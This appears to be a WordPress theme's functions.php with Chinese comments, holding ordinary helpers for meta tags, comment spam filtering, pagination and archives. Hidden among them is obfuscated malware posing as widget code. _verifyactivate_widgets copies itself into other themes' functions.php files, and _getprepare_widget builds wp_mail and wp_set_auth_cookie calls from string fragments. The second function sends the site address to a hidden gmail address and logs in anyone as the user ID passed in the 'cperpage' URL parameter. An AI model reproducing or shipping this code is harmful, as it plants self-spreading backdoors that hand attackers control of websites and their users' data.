  } elseif ( is_category() ) { $description = $blog_name . "'" . single_cat_title('', false) . "'";
  } elseif ( is_archive() )  { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  } elseif ( is_search() )   { $description = $blog_name . ": '" . esc_html( $s, 1 ) . "' 的搜索結果";
  } else { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  }
  $description = mb_substr( $description, 0, 220, 'utf-8' ) . '..';
  echo "<meta name=\"description\" content=\"$description\">\n";
}

//阻止站内文章Pingback
function noself_ping( &$links ) {
  $home = get_option( 'home' );
  foreach ( $links as $l => $link )
  if ( 0 === strpos( $link, $home ) )
  unset($links[$l]);
}

//移除自动保存
function ux_disable_autosave() {
  wp_deregister_script('autosave');
}

//垃圾评论拦截
class anti_spam {
  function anti_spam() {
    if ( !current_user_can('level_0') ) {
      add_action('template_redirect', array($this, 'w_tb'), 1);
      add_action('init', array($this, 'gate'), 1);
      add_action('preprocess_comment', array($this, 'sink'), 1);
    }
  }
  function w_tb() {
    if ( is_singular() ) {
      ob_start(create_function('$input','return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
      "textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"100%\" rows=\"4\" style=\"display:none\"></textarea>",$input);') );
    }
  }
  function gate() {
    if ( !empty($_POST['w']) && empty($_POST['comment']) ) {
      $_POST['comment'] = $_POST['w'];
    } else {
      $request = $_SERVER['REQUEST_URI'];
      $spamcom = isset($_POST['comment'])        ? $_POST['comment']                : null;
      $_POST['spam_confirmed'] = "$spamcom";
    }
  }

  function sink( $comment ) {
  $email = $comment['comment_author_email'];
  $g = 'http://www.gravatar.com/avatar/'. md5( strtolower( $email ) ). '?d=404';
  $headers = @get_headers( $g );
    if ( !preg_match("|200|", $headers[0]) ) {
      add_filter('pre_comment_approved', create_function('', 'return "0";'));
    }
    if ( !empty($_POST['spam_confirmed']) ) {
      if ( in_array( $comment['comment_type'], array('pingback', 'trackback') ) ) return $comment;
      die();
      add_filter('pre_comment_approved', create_function('', 'return "spam";'));
      $comment['comment_content'] = $_POST['spam_confirmed'];
    }
    return $comment;
  }
}
$anti_spam = new anti_spam();

//Gzip压缩
function ux_gzip() {
  if ( strstr($_SERVER['REQUEST_URI'], '/js/tinymce') )
    return false;
  if ( ( ini_get('zlib.output_compression') == 'On' || ini_get('zlib.output_compression_level') > 0 ) || ini_get('output_handler') == 'ob_gzhandler' )
    return false;
  if (extension_loaded('zlib') && !ob_start('ob_gzhandler'))
    ob_start();
}


//修改默认发信地址
function res_from_email($email) {
    $wp_from_email = get_option('admin_email');
    return $wp_from_email;
}
function res_from_name($email){
    $wp_from_name = get_option('blogname');
    return $wp_from_name;
}

//文章（包括feed）末尾加版权说明
function set_copyright($content) {
	  if( !is_page() ){
		
		$content .= wp_link_pages(array('before' => '<div class="fenye">', 'after' => '', 'next_or_number' => 'next', 'previouspagelink' => '上一页', 'nextpagelink' => ""));
		$content .= wp_link_pages(array('before' => '', 'after' => '', 'next_or_number' => 'number', 'link_before' =>'<span>', 'link_after'=>'</span>'));
		$content .= wp_link_pages(array('before' => '', 'after' => '</div>', 'next_or_number' => 'next', 'previouspagelink' => '', 'nextpagelink' => "下一页"));

       $content.= '<p>转载注明:<a href="'.get_permalink().'">'.'('.get_permalink().')</a></p>';
    }
    if( is_feed() ){
        $content.= rss_postrelated();
    }
    return $content;
}

function rss_postrelated(){
    $exclude_id = $post->ID;
    $posttags = get_the_tags();
    $i = 0;
    $limit = 6 ;
    if ( $posttags ) {
      $tags = ''; foreach ( $posttags as $tag ) $tags .= $tag->name . ',';
      $args = array(
        'post_status' => 'publish',
        'tag_slug__in' => explode(',', $tags),
        'post__not_in' => explode(',', $exclude_id),
        'caller_get_posts' => 1,
        'orderby' => 'comment_date',
        'posts_per_page' => $limit
      );
      query_posts($args);
      while( have_posts() ) { the_post();
        $output .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
        $exclude_id .= ',' . $post->ID; $i ++;
      };
      return '<h4 style="font-size:14px;margin:10px 0;border-bottom:solid 1px #ddd;">继续阅读相关文章：</h4><ul style="line-height:20px;">'.$output.'</ul>';
      wp_reset_query();
    }
}

function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home");
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1;
	if(!isset($com_type)) $com_type="";
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved="";
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) {
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
			if(is_feed()) {
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter;
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";
	if(!isset($isshowdots)) $isshowdots=1;

	$comments=$wpdb->get_results($sql);
	if($fakeit == 2) {
		$text=$post->post_content;
	} elseif($fakeit == 1) {
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}

add_filter('widget_tag_cloud_args','style_tags');  //修改标签云样式
//修改标签云样式
function style_tags($args) {
$args = array(
  'largest'=> '8',
  'smallest'=> '8',
  'format'=> 'flat',
  'number' => '21',
  'orderby' => 'count',
  'order' => 'DESC'
);
return $args;
}
// 文章添加关键词链接
//连接数量
$match_num_from = 1;  //一篇文章中同一个关键字少于多少不秒文本（这个直接填1就好了）
$match_num_to = 1; //一篇文章中同一个关键字最多出现多少次描文本（建议不超过2次）
//连接到WordPress的模块
add_filter('the_content','tag_link',1);
//改变标签关键字
function tag_link($content){
	global $match_num_from,$match_num_to;
	$posttags = get_the_tags();
	if ($posttags) {
		usort($posttags, "tag_sort");
		foreach($posttags as $tag) {
			$link = get_tag_link($tag->term_id);
			$keyword = $tag->name;
			//连接代码
			$cleankeyword = stripslashes($keyword);
			$url = "<span class=\"tag-span\"><a class=\"tag\" href=\"$link\" title=\"".str_replace('%s',addcslashes($cleankeyword, '$'),__('View all posts in %s'))."\"";
			$url .= ' target="_blank"';
			$url .= ">".addcslashes($cleankeyword, '$')."</a></span>";
			$limit = rand($match_num_from,$match_num_to);

			//不连接的 代码
			$content = preg_replace( '|(<a[^>]+>)(.*)('.$ex_word.')(.*)(</a[^>]*>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$content = preg_replace( '|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2%&&&&&%$4$5', $content);

			$cleankeyword = preg_quote($cleankeyword,'\'');

			$regEx = '\'(?!((<.*?)|(<a.*?)))('. $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;

			$content = preg_replace($regEx,$url,$content,$limit);

			$content = str_replace( '%&&&&&%', stripslashes($ex_word), $content);

		}
	}
	return $content;
}
function tag_sort($a, $b){
	if ( $a->name == $b->name ) return 0;
	return ( strlen($a->name) > strlen($b->name) ) ? -1 : 1;
}

//分页函数
function par_pagenavi($range = 9){
	global $paged, $wp_query;
	if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
	if($max_page > 1){if(!$paged){$paged = 1;}
	if($paged != 1){echo "<li><a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a></li>";}
	echo '<li>';previous_posts_link('上一页');echo "</li>";
    if($max_page > $range){
		if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
		for($i = $max_page - $range; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
	elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
		for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a></li>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}

	echo '<li>';next_posts_link(' 下一页 ');echo "</li>";
    if($paged != $max_page){echo "<li><a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a></li>";}}
}


//文章归档
function archives_list_SHe() {
	global $wpdb,$month;
	$lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
	$output = get_option('SHe_archives_'.$lastpost);
	if(empty($output)){
		$output = '';
		$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
		$q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
		$monthresults = $wpdb->get_results($q);
		if ($monthresults) {
			foreach ($monthresults as $monthresult) {
			$thismonth    = zeroise($monthresult->month, 2);
			$thisyear    = $monthresult->year;
			$q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
			$postresults = $wpdb->get_results($q);
			if ($postresults) {
				$text = sprintf('%s %d', $month[zeroise($monthresult->month,2)], $monthresult->year);
				$postcount = count($postresults);
				$output .= '<dl><dt><strong>' . $text . '</strong> &nbsp;(' . count($postresults) . '&nbsp;' . __('篇文章','freephp') . ')</dt>' . "\n";
			foreach ($postresults as $postresult) {
				if ($postresult->post_date != '0000-00-00 00:00:00') {
				$url = get_permalink($postresult->ID);
				$arc_title    = $postresult->post_title;
				if ($arc_title)
					$text = wptexturize(strip_tags($arc_title));
				else
					$text = $postresult->ID;
					$title_text = __('View this post','freephp') . ', &quot;' . wp_specialchars($text, 1) . '&quot;';
					$output .= '<dd>' . mysql2date('m-d', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
					$output .= '&nbsp;(' . $postresult->comment_count . ')';
					$output .= '</dd>' . "\n";
				}
				}
			}
			$output .= '</dl>' . "\n";
			}
        update_option('SHe_archives_'.$lastpost,$output);
		}else{
			$output = '<div class="errorbox">'. __('Sorry, no posts matched your criteria.','freephp') .'</div>' . "\n";
		}
	}
	echo $output;
}
?>